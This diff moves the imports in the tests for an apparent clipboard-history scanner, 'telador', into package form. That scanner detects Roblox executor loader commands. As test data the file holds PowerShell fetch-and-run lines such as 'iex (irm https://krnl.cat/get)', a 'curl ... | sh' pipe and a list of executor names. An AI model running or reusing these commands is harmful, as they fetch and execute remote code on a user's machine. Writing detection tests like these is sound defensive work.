@@ -20,13 +20,13 @@ def _write_utf16(path: str, text: str) -> None:
 
 class TestExtractStrings:
     def test_utf16_run(self):
-        import clipboard_history_scanner as ch
+        from telador import clipboard_history_scanner as ch
         blob = b"\xff\xfe" + "iex (irm https://krnl.cat/get)".encode("utf-16-le")
         strs = ch._extract_strings(blob)
         assert any("krnl.cat" in s.lower() for s in strs)
 
     def test_utf8_run(self):
-        import clipboard_history_scanner as ch
+        from telador import clipboard_history_scanner as ch
         blob = b"xxxx iex (irm https://solara.example/x) yyyy"
         strs = ch._extract_strings(blob)
         assert any("solara" in s.lower() or "iex" in s.lower() for s in strs)
@@ -34,30 +34,30 @@ class TestExtractStrings:
 
 class TestClassify:
     def test_iex_irm_high(self):
-        import clipboard_history_scanner as ch
+        from telador import clipboard_history_scanner as ch
         m, sev = ch._classify("iex (irm https://krnl.cat/get)")
         assert m is not None
         assert sev in ("high", "medium", "critical")
 
     def test_benign_text_clean(self):
-        import clipboard_history_scanner as ch
+        from telador import clipboard_history_scanner as ch
         m, _ = ch._classify("https://google.com/search?q=roblox")
         assert m is None
 
     def test_signature_list_ignored(self):
-        import clipboard_history_scanner as ch
+        from telador import clipboard_history_scanner as ch
         # Lista de keywords = wordlist, não invocação
         m, _ = ch._classify("solara|xeno|wave|krnl|fluxus|oxygen")
         assert m is None
 
     def test_telador_meta_ignored(self):
-        import clipboard_history_scanner as ch
+        from telador import clipboard_history_scanner as ch
         m, _ = ch._classify("telador scan_clipboard changelog combatroblox")
         assert m is None
 
     def test_curl_tutorial_not_flagged(self):
         """curl/wget em tutorial legítimo = ruído de clipboard, não hit."""
-        import clipboard_history_scanner as ch
+        from telador import clipboard_history_scanner as ch
         m, _ = ch._classify("curl https://get.docker.com | sh")
         assert m is None
         m, _ = ch._classify("In this tutorial we will use curl to download the file")
@@ -65,18 +65,18 @@ class TestClassify:
 
     def test_downloadstring_docs_not_flagged(self):
         """Snippet .NET com nome DownloadString sem payload = FP clássico."""
-        import clipboard_history_scanner as ch
+        from telador import clipboard_history_scanner as ch
         m, _ = ch._classify("function DownloadString() { return data; }")
         assert m is None
 
     def test_iex_without_url_not_flagged(self):
         """Fragmento 'iex' solto sem URL = incompleto / ruído."""
-        import clipboard_history_scanner as ch
+        from telador import clipboard_history_scanner as ch
         m, _ = ch._classify("remember to use iex carefully")
         assert m is None
 
     def test_real_loader_still_flagged(self):
-        import clipboard_history_scanner as ch
+        from telador import clipboard_history_scanner as ch
         m, sev = ch._classify("iex (irm https://krnl.cat/get)")
         assert m is not None
         assert sev == "high"
@@ -86,7 +86,7 @@ class TestClassify:
 
 class TestScanDisk:
     def test_historydata_hit(self):
-        import clipboard_history_scanner as ch
+        from telador import clipboard_history_scanner as ch
         with tempfile.TemporaryDirectory() as tmp:
             root = os.path.join(tmp, "Clipboard")
             path = os.path.join(
@@ -101,7 +101,7 @@ class TestScanDisk:
         assert any("clipboard:" in (i.get("matched") or "") for i in r["items"])
 
     def test_pinned_label(self):
-        import clipboard_history_scanner as ch
+        from telador import clipboard_history_scanner as ch
         with tempfile.TemporaryDirectory() as tmp:
             root = os.path.join(tmp, "Clipboard")
             path = os.path.join(
@@ -118,7 +118,7 @@ class TestScanDisk:
 
 class TestScanLive:
     def test_live_clipboard_hit(self):
-        import clipboard_history_scanner as ch
+        from telador import clipboard_history_scanner as ch
         with tempfile.TemporaryDirectory() as tmp:
             root = os.path.join(tmp, "Clipboard")
             os.makedirs(root, exist_ok=True)
@@ -133,7 +133,7 @@ class TestScanLive:
         assert any("clipboard-live:" in (i.get("matched") or "") for i in r["items"])
 
     def test_clean_when_empty(self):
-        import clipboard_history_scanner as ch
+        from telador import clipboard_history_scanner as ch
         with tempfile.TemporaryDirectory() as tmp:
             root = os.path.join(tmp, "Clipboard")
             os.makedirs(root, exist_ok=True)
@@ -147,7 +147,7 @@ class TestScanLive:
 
 class TestHistoryOff:
     def test_meta_when_disabled(self):
-        import clipboard_history_scanner as ch
+        from telador import clipboard_history_scanner as ch
         with tempfile.TemporaryDirectory() as tmp:
             root = os.path.join(tmp, "Clipboard")
             os.makedirs(root, exist_ok=True)
@@ -163,10 +163,9 @@ class TestHistoryOff:
 
 class TestChain:
     def test_registry_and_count(self):
-        import scanner_registry
-        import version
-        import telador
-
+        from telador import scanner_registry
+        from telador import version
+        from telador import cli as telador
         reg = scanner_registry.build_registry()
         names = {m.fn_name for m in reg}
         assert "scan_clipboard_history" in names
@@ -184,6 +183,6 @@ class TestChain:
         assert any(fn.__name__ == "scan_clipboard_history" for fn in chain)
 
     def test_evidence_slug(self):
-        from evidence import _source_slug_from_name
+        from telador.evidence import _source_slug_from_name
         assert _source_slug_from_name("Clipboard History") == "clipboard_history"
         assert _source_slug_from_name("[Clipboard/atual] iex") == "clipboard_history"
